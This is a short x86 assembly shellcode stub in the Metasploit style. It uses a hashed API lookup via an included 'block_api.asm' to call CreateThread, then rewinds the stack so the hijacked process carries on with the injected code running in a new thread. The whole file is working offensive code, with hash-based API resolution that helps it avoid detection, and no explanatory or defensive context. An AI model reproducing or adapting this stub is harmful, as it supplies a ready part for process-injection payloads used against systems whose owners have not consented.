
[BITS 32]
[ORG 0]

  cld
  call start
delta:
%include "block_api.asm"
start:
  pop ebp ; pop off the address of 'api_call' for calling later.
  xor eax, eax
  push eax
  push eax
  push eax
  lea ebx, [ebp+threadstart-delta]
  push ebx
  push eax
  push eax
  push 0x160D6838 ; hash( "kernel32.dll", "CreateThread" )
  call ebp ; CreateThread( NULL, 0, &threadstart, NULL, 0, NULL );
  popa ; A
  sub dword [esp],5	; length of original call
  ret
threadstart:
  pop eax ; pop off the unused thread param so the prepended shellcode can just return when done.
